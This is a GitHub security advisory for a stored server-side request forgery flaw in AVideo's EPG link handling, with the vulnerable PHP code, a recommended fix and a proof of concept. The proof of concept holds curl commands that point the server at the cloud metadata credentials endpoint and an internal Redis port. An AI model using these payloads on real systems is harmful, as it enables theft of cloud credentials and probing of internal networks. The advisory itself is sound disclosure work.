# [M] AVideo: Stored SSRF via Video EPG Link Missing isSSRFSafeURL() Validation

## Summary
Severity: Medium
Advisory: GHSA-x5vx-vrpf-r45f
CVE: CVE-2026-34740
CWE: CWE-918
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-04-01
Source: https://github.com/advisories/GHSA-x5vx-vrpf-r45f
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The EPG (Electronic Program Guide) link feature in AVideo allows authenticated users with upload permissions to store arbitrary URLs that the server fetches on every EPG page visit. The URL is validated only with PHP's `FILTER_VALIDATE_URL`, which accepts internal network addresses. Although AVideo has a dedicated `isSSRFSafeURL()` function for preventing SSRF, it is not called in this code path. This results in a stored server-side request forgery vulnerability that can be used to scan internal networks, access cloud metadata services, and interact with internal services.

## Details

When a user adds or edits a video, the EPG link is stored via `objects/videoAddNew.json.php:119`:

```php
$obj->setEpg_link($_POST['epg_link']);
```

The only validation applied is `FILTER_VALIDATE_URL`, which accepts URLs targeting internal addresses such as `http://127.0.0.1`, `http://169.254.169.254`, or `http://10.0.0.1`.

Later, when the EPG data is parsed, the stored URL is fetched server-side at `objects/EpgParser.php:358`:

```php
$this->content = @\file_get_contents($this->url);
```

The `file_get_contents()` function follows redirects and supports multiple protocols including `http://`, `https://`, `ftp://`, and depending on PHP configuration, `php://` and other stream wrappers.

The codebase contains an `isSSRFSafeURL()` function that validates URLs against internal network ranges, but this function is not invoked anywhere in the EPG link processing path.

Because the URL is stored in the database, every subsequent visit to the EPG page re-triggers the server-side request. This makes the SSRF persistent and repeatable without further attacker interaction.

## Proof of Concept

1. Authenticate as a user with upload permissions.

2. Create or edit a video and set the EPG link to an internal target:

```bash
# Target the cloud metadata service
curl -b "PHPSESSID=USER_SESSION" \
  -X POST "https://your-avideo-instance.com/objects/videoAddNew.json.php" \
  -d "title=Test+Video&epg_link=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

3. Trigger the EPG parser by visiting the video's EPG page, or wait for the next page load that processes EPG data:

```bash
curl -b "PHPSESSID=USER_SESSION" \
  "https://your-avideo-instance.com/plugin/Live/view/Live_schedule/?videos_id=VIDEO_ID"
```

4. To scan internal ports, set the EPG link to various internal addresses:

```bash
# Scan an internal service
curl -b "PHPSESSID=USER_SESSION" \
  -X POST "https://your-avideo-instance.com/objects/videoAddNew.json.php" \
  -d "title=Test+Video&epg_link=http://127.0.0.1:6379/"
```

5. The server fetches the URL via `file_get_contents()`. Response differences (timing, error messages, or returned content via EPG display) reveal whether internal services are running.

## Impact

An authenticated user with upload permissions can force the AVideo server to make HTTP requests to arbitrary internal and external targets. This enables scanning of internal networks, access to cloud instance metadata (potentially exposing IAM credentials on AWS/GCP/Azure), and interaction with internal services that are not intended to be externally accessible. The stored nature of this SSRF means it re-executes on every page visit, amplifying the impact.

- **CWE-918**: Server-Side Request Forgery (SSRF)
- **Severity**: Medium

## Recommended Fix

Add an `isSSRFSafeURL()` check before the `file_get_contents()` call at `objects/EpgParser.php:355`:

```php
if (function_exists('isSSRFSafeURL') && !isSSRFSafeURL($this->url)) {
    throw new \RuntimeException('URL blocked by SSRF protection');
}
```

This reuses the existing SSRF protection function that is already applied in other code paths.

---
*Found by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-x5vx-vrpf-r45f
- https://nvd.nist.gov/vuln/detail/CVE-2026-34740
- https://github.com/WWBN/AVideo/commit/677d1a314d46abce457c7b662afbb58b0d9f17a2
- https://github.com/WWBN/AVideo
